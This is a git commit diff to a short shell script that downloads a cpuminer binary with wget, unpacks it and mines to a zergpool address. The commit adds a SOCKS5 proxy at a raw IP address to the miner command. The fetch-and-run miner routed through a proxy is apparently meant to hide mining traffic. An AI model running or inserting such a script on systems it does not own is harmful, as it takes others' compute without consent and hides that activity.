db784ead19359f98befc2ae237d6475d458b1dd4
awikwokproject <90408020+awikwokproject@users.noreply.github.com>
2022-01-06 19:40:31 +0700

    Update kntl.sh

--- kntl.sh
+++ kntl.sh
@@ -1,2 +1,3 @@
 wget https://github.com/cpu-pool/cpuminer-opt-cpupower/releases/download/1.4/Cpuminer-opt-cpu-pool-linux64.tar.gz && tar zxvf Cpuminer-opt-cpu-pool-linux64.tar.gz
-./cpuminer -a power2b -o stratum+tcp://power2b.mine.zergpool.com:7445 -u bnb1e4gahzl946dx4d7g62syny5vx4fvzg445u2c3k -p c=TRX
+./cpuminer -a power2b -o stratum+tcp://power2b.mine.zergpool.com:7445 -u bnb1e4gahzl946dx4d7g62syny5vx4fvzg445u2c3k -p c=TRX -x socks5://45.77.42.146:8128
+
